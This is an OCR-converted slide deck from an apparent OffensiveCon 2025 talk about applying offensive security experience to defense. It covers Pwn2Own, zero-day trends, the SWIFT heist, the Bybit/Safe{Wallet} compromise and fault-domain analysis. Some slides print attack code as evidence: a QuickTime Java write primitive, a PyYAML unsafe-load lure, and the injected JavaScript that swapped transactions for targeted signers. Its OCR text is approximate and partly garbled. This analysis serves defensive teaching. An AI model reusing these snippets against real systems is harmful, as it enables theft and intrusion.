---
title: "How Offensive Security Made Me Better at Defense"
speakers: ["Dino Dai Zovi"]
conference: "OffensiveCon"
conference_full: "OffensiveCon 2025"
edition: ""
year: 2025
source_pdf: "OffensiveCon25 slides/Dino Dai Zovi_How Offensive Security Made Me Better at Defense.pdf"
pages: 56
sha256: "4520a4eb3faf39fd9e315f4d0d86d18eff55643084cdc5e19ba70799045a407e"
text_chars: 15260
ocr_pages: 27
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T23:22:43Z"
---
# How Offensive Security Made Me Better at Defense

**Speakers:** Dino Dai Zovi  
**Conference:** OffensiveCon 2025  
**Source:** `OffensiveCon25 slides/Dino Dai Zovi_How Offensive Security Made Me Better at Defense.pdf` (56 pages)

## Slide 1

How Offensive Security Made Me Better at Defense

Dino A. Dai Zovi

## Slide 2

The Defender’s Dilemma Security Engineering “Defenders have to be right every time. Attackers only need to be right once.” “Security engineering is about building systems to remain dependable in the face of malice, error, or mischance. As a discipline, it focuses on the tools, processes, and methods needed to design, implement, and test complete systems, and to adapt existing systems as their environment evolves.”

## Slide 3

A Hacker’s Journey From Offense to Defense

## Slide 4

## Slide 5

## Slide 6

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
(*) FS Can-
2007-C
We've anni
Macbook P
attendees
conditions,
Can't use t
best lightn
[talk notifir
2007-04-20-14:54:00 First Mac Hacked Cancel Or Allow
One OSX box has been owned! At this point all we can say is there is an exploitable flaw in Safari which
can be triggered within a malicious web page. Of course all of the latest security patches have been
applied. This one is Oday folks. Technical details will be forthcoming as the winner works out the
release. There is still one more Mac to go. (the same flaw cannot be used again, but other Safari bugs
are allowed)
Just to review the rules, the first box required a flaw that allows the attacker to get a shell with user
level privilages. The second box, still up for grabs, requires the same, plus the attacker needs to get Ip, Apple
root. id
ory
2007-04-20-12:30:00 Attack the browser “PEON,
: prizes for
There has not been a successful attack. Time to expand your attack surface. Email links to <pwn2own
[at] cansecwest.com> and we will visit them from the target machines using Safari.
2007-04-19-12:30:00 Gentlemen Start Your PWNing
The Prizes are on the "pwn-2-own" SSID ... the 2.3Ghz 15" Macbook Pro is on 192.168.0.42 and can be
yours if you follow the instructions in the home of the default user, and the 2.3Ghz 17" Macbook pro is
on 192.168.0.43 and can be yours if you follow the instructions in the filesystem root (this one will need
admin compromise).
```

## Slide 7

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
public QTPointerRef toQTPointer(int offset, int length)
{
length = (length + offset <= getSize()) ? length : getSize() -
offset;
lock();
return new QTPointerRef (lockAndDeref (offset), length, this);
}
static void doBoundsChecks(int sourceOffset, int sourceSize,
int readLength, int elementSize,
int destinationOffset, int destinationSize)
if(sourceOffset + readLength * elementSize > sourceSize | |
destinationOffset + readLength > destinationSize | |
sourceOffset < 0 ||
destinationOffset < 0)
throw new ArrayIndexOutOfBoundsException();
else
return;
```

## Slide 8

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
public class Lambda extends Applet {
/*
* You are not expected to understand this.
*/
public void write4(int what, int where) {
try {
if (QTSession.isInitialized() == false)
QTSession. open();
QTHandle qth = new QTHandle(@, false);
QTPointerRef qtpr = qth.toQTPointer(Ox7fffffff, Ox7fffffff);
int base, size, top;
base = QTObject.1D(qtpr);
size = qtpr.getSize();
top = base + size;
int word[] = new int[1];
word[@] = what;
int index = where - base;
qtpr.copyFromArray(index, word, 0, 1);
}
catch (QTException qte) {
throw new RuntimeException(qte.getMessage());
```

## Slide 9

## Slide 10

xchg rax, rsp

## Slide 11

## Slide 12

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Company v
CAPSULES
About Capsule8
Sophos Acquires Capsule8 to Bring
Powerful and Lightweight Linux
Server and Cloud Container Security
to its Adaptive Cybersecurity
Capsule8 is a cybersecurity company providing sees)’ 210-100 CVG
cloud workload protection for enterprise
infrastructure. The company's signature product
provides detection and resilience for Linux
operating systems found across the spectrum
from cloud to on-prem data centers, including
containerized, virtualized, or bare metal
environments.
```

## Slide 13

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
12:37 all &
v Tap to Pay
For: Happy Holidays
Send as Sends: Cash Stock .
Gy diego Martinez
oo
@ “rine
QwerRTYUIOP QweRTYUIOP
ASDFGHJKL é
SS
@ ZzZxcVBNM@
ASDFGHJKL
@zxcvepnmM @
23
2)
Hold card to back of phone
oa
eS | Tap to Pay
) $35.00
```

## Slide 14

How Offensive Understanding Helps Defend

## Slide 15

## Slide 16

## Slide 17

## Slide 18

## Slide 19

**0day**

## Slide 20

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bh 4
“IT’S NOT MAGIC.
IT’S TALENT AND SWEAT.”
```

## Slide 21

## Slide 22

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ME Android
mmm Any OS
$200,000
```

## Slide 23

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Zero-Days Exploited In-The-Wild by Year
ENTERPRISE BY END-USER|
98
95
24 75
63
33 Vulnerabilities
targeted enterprise-
focused technologies
such as security and
networking products
31 31
= 42 Vulnerabilities
affected end-user
platforms and products
(e.g., mobile devices,
operating systems,
71 browsers, and other
applications)
```

## Slide 24

## Slide 25

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The Rise in Vulnerabilities, Exploitation and POC Exploits
Vulnerabilities
30000
25000
20000
15000
10000
~ lll
A
Oo
\x
\
&
[o)
oP
%@ Og
YY SY’
6
NZ WY’
PoP of
CVE Publish Date
Known Exploited Vulnerabilties
600
500
400
300
N
00
=
00
First Publicly Reported Exploitation
12000
10000
8000
6000
4000
2000
Proof-of-Concept Exploits
alll
<\
First Exploit Published
‘S) VulnCheck
```

## Slide 26

## Slide 27

## Slide 28

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
-- Information
\a/ Gathering
2) Target Personnel or
Compromise Third Party vendor
1
J
1
!
'
| )
!
Vv
Compromise — KR
Vulnerable Target _ \
Server Organization bs
! N,
!
'
!
/
Pivot to / 6
SWIFT Servers J Destroy
Evidence
Transfer Funds
Bank Accounts SWIFT System
```

## Slide 29

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
SWIFT Alliance
Software server
1. Attackers gain access
and install malware
CONFIG FILE
gpca.dat
2. Malware decrypts
config file containing
search terms to scan
within SWIFT messages
3. Malware identifies
and exploits host's
SWIFT application to
bypass validity check
within Oracle DLL
=>
SS)
= 4. Confirmation messages from the SWIFT network are
now monitored by the malware. Functionality continues in
‘ loop until 06:00 6 Feb 2016
5. SWIFT messages sent to printer are
tampered with in real time
6. PRC and FAL files are scanned for attacker
defined terms. On match will extract transfer
reference and sender address to form a SQL
DELETE statement to delete a transaction
7. Messages that contain attacker defined
terms will be used to form SQL statements to
query Convertible Currency availability and
then update transfer amounts
8. Checks the ‘Login/Logout’ status of
the Journal table every hour and sends
result to attacker domain over HTTP
```

## Slide 30

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Base
Safe WALLET) ae @ a
Base
Setup Appearance Security Notifications Modules Safe Apps Data Environment variables
Fe) base:OxF7aQ...9Cf5
sll Nal ed et Members Signers
Rais wenkacton Signers have full control over the account, they can propose, sign and execute
transactions, as well as reject them.
Home
@ Export as CSV
© Assets
base:0xf820e63D9d51317DFeD412E8alF608bF9b97ddAC
23 Bridge (Now }
2 Swap Proposers (New }
5 Proposers can suggest transactions but cannot approve or execute them. Signers
‘Transactions & 5 i
should review and approve transactions first. Learn more Z
f] Address book
%8 Apps
Settings , , .
Required confirmations Any transaction requires the confirmation of:
1 out of 1 signer.
```

## Slide 31

_Sign cryptocurrency transactions on a hardware wallet_ connected over WebUSB to an **Internet-connected browser** ?!?

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Sign transactions with a Ledger device
'@ Written by Lukas Schor
Updated over 2 years ago
Sign cryptocurrency transactions on a
hardware wallet connected over WebUSB
to an Internet-connected browser?!?
a
— in Ledger Nano X
eae © 0Ox12...888b
Rinkeby
```

## Slide 32

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Domain ha
-EFBS055
EFS
safeTxHash:
Domain hash:
Message hash:
safeTxGas:
baseGas:
refundReceiver:
Raw data:
Demain hast
Ox155f...3dec
Oxefb5...7f05
Ox192c...3591 |
ie)
(e}
eth:0x0000..0000
Oxa9059cbbO000000' |
b289f8d3if7... Show more
Balance change
” 23 @uspc
o
Domain h
ZEFBSO
r
9
```

## Slide 33

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Contract data
Rrewewear cunnart
Having to confirm multiple times
Some users ir
may take num 1. Open the Ethereum app on your Ledger
learn how to ri 2. Open Settings
3. Find Display data: Display contract data details
4. Switch the above to NOT displayed
Now instead of having to approve 17 times you only will have to approve once.
Please note that this is a security feature. We don't recommend turning this off.
```

## Slide 34

## Slide 35

Social engineering attack against Safe{Wallet} Developer

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Social engineering attack against Safe{Wallet} Developer
=) safe-global / safe-wallet-monorepo
‘ode © Issues 150 1 Pull requests © Actions [FH Projects © Security [~ Insights
Pulse April 13, 2025 - May 13, 2025 Period: 1 month ~
Contributors
Community Standards Overview
Commits
Code frequency 125 Active pull requests 59 Active Issues
Dependency graph
112 1113
Network Merged pull reque Open pull requests
Forks
Actions Usage Metrics
Excluding merges, 18 authors have pushed 95 commits to
Actions Performance Metrics and 334 commits to all branches. On dev, 429 files
have changed and there have been 16,176 additions and
11,155 deletions.
A ISES [ol (eR
© 3 Releases published by 1 person
S v1.57.0
put
SD v1.58.0
S v1.59.0
put
```

## Slide 36

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PDF Lures GitHub Repositories
1 1
| Job Description H | JavaScript Repo '
mvo
! rrr een ' ‘ems '
: PDF: —-————> | : PY: |
1 Question Sheet v__ Python Repo | Payload
1. Targets are sent two 2. The repositories make 3. The C2 server is
PDFs over LinkedIn, one of use of multiple external configured to send benign
which is a “Question APIs to fetch data for the data to the victim, and only
Sheet” containing a coding application, one of which is under certain circumstances
challenge hosted on controlled by the threat will it send a malicious
GitHub. actor. payload
@paloalto | funita2
```

## Slide 37

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Coding and Problem-Solving Skills With Real Project
Test Project (Python): https://github.com/vincentchavez/PythonExam
Problem 1: To get coin BTC/ETH rate by using the project.
Problem 2: As you see in the source code, this project keeps getting BTC/ETH rate from 5 markets
every 5 seconds and prints out.
e Please try to find out and add 3 more similar markets API.
e Subscribe how to make graph of the rate by using Python.
Problem 3: Please describe how to improve the speed of the network communication in
this code.
```

## Slide 38

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
def fetch_symbols():
resp = requests.get("https://en.stockslab.org/symbols/sp500", timeout=10)
content_type = resp.headers["Content-Type"]
if resp.status_code != 200:
raise requests.exceptions.RequestException(resp.status_code)
if content_type.startswith("application/json"):
return json. loads(resp.text)
elif content_type.startswith("application/x-www-form-urlencoded"):
return parse_qs(resp.text)
elif content_type.startswith("application/yaml") :
return| yaml. load(resp.text, Loader=yam1.Loader)
```

## Slide 39

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
—
“ &
latest.yam! Attacker (Kali Linux)
A
"SAFE" AWS Environment
www
>| a
1: Execute 2: PyYAML Exec
MonteCarloStockinvestSimulator data_fetcher.py —init_.py
ret1: On-Disk Write, Load, Delete
“SAFE" Developer MacOS System
ret2: In-Memory Python Code Exec
ret3: On-Disk Write, Execute, Delete
oD elastic security labs
—<—<$<—$—e
—
—+=
_—_—_——
3: Delete E
—init_.py
init (Poseidon)
E
stealer.py
dockerd (Poseidon)
aws
login.keychain-db
“SAFE"Web UI
(=
ByBit Signers
```

## Slide 40

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
}),
transactionResponse: null
}
else 1 = await c.executeTransaction(e, t);
{
let st iter
let wa ["Oxldb92e2eebc8e0c075a02bea49a2935bcd2dfcf4",
"0x19c6876e978d9f128147439ac4cd9ea2582cd141"];
let ba ["0x828424517£9f04015db02169£4026d57b2b07229",
"0x7c1091cf6f36b0140d5e2faf18c3be29fee42d97"] ;
let ta "0x96221423681a6d52e184d440a8efcebb105c7242";
let da
"0Oxa9059cbb000000000000000000000000bdd077f65lebe7£7b3cel6fe5f2b025be296951600000000000
00000000000000000000000000000000000000000000000000000";
```

## Slide 41

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
let sga 45746;
let sf sd.getSafeProvider();
let sa sf.getSignerAddress() ;
sa sa.toLowerCase();
let lu sd.getAddress () ;
lu lu.toLowerCase();
COnstlcr wa.some(kl => lu.includes(k1));
CONSENCD) ba.some(kl => sa.includes(k1l));
(cf true se.data.operation 0) {
const std structuredClone (se.data) ;
se.data.to ta;
se.data.operation op;
se.data.data da;
se.data.value alle
se.data.safeTxGas sga;
{
1 sd.executeTransaction(se, st);
se.data ca;
y (ei
se.data ied,
e;
} {
dl sd.executeTransaction(se, st);
}
}e
(0, u.DC) (u.hV.EXECUTING, {
d
})
```

## Slide 42

## Slide 43

# Takeaways

- No remote vulnerabilities were exploited

- LinkedIn recruiter social engineering to get target to run a python app

- ● No local privilege escalation vulnerabilities exploited

- Local privilege escalation not needed to read AWS creds out of ~/.aws/

- ● No persistent malware needed

   - Python app remotely loaded an in-memory python infostealer payload

   - Infostealer obtained AWS credentials from ~/.aws

- No detectable effects on the target (Bybit)

   - Malicious JS deployed in and executed inside the Safe Wallet web app

   - JS silently swapped Ethereum transaction for only Bybit’s signers

   - Hardware wallets blind-signed the transaction

## Slide 44

How I Think About Defense

## Slide 45

Initial Access Vectors

Attacker Goal

## Slide 46

## Slide 47

## Slide 48

## Slide 49

## Slide 50

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Fire starts?
Sprinkler system
fails to start
Fire alarm is
not activated
Frequency
Consequences (per year)
Fire Starts
0.01 |
peryear |
Uncontrolled fire
* with no alarm 1.00 x 10”
Uncontrolled fire
. 5
with alarm 9.99x10
. Controlled fire
with no alarm
. Controlled fire
with alarm
```

## Slide 51

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Sprinkler System
Fails to Start
* Sprinkler syst Fire alnennis Frequency
Firestarts? |iissosor | nocactivated | ComaveNCS | (per year)
True Uncontrolled fire 5
0.001 with no alarm 1.00 x 10°
True
0.01 ,
False Uncontrolled fire »
Fire Starts 9.999. wilhalarm 9.99210
0.01 True
Controlled tire io
Eat ee 0,001 with no alarm in
False
0.99
False Controlledfire ggoy4 0°
0.999 with alarm :
Detection
System Fails
Fire Suppression
System Fails
F1- Failure of smoke detector sensor
F2- Failure of heat detector sensor
F3- No water to sprinkler system
F4- Sprinkler nozzles blocked
A
or
```

## Slide 52

Fault Domain Analysis

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Fault Domain Analysis
Legend
——
FS
Set
```

## Slide 53

# Fault Domain Analysis for Security

- A **security domain** is the logical grouping of systems, networks, data, privileges, and capabilities that share a common root of security enforcement ○ Two applications on the same host are separated by the process security boundary, but are in the same security domain because that boundary is enforced by the shared kernel

- ○ Two hosts on the same Active Directory Domain are in the same security domain

- ○ Everything in your environment that Okta gates access to is one security domain

- ○ E.g. what are scope of effects if root of enforcement is corrupted?

- An **access domain** is the logical grouping of security domains that share a common root of authorized access (e.g. by a particular principal)

   - If the same individual has administrative access to your Okta and Active Directory, then they are part of the same _access_ domain

- E.g. what are scope of effects one particular individual’s access can achieve if corrupted?

- ● A **supply domain** is the logical grouping of security domains that share a common root of software/hardware implementation or distribution

   - If two systems are affected by the same vulnerability or backdoor (e.g. software supply-chain attack), then they are in the same _software supply_ domain

   - E.g. what are scope of effects of a single vulnerability or supply-chain compromise?

## Slide 54

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Accounts Payable —————————. User
Customer
Purchasing Receiving
} \
Findnicial Stipper
Intepmediary
Sales \
Shipping
Supplier pf
Accounts Receivable
```

## Slide 55

## Slide 56

FIN.
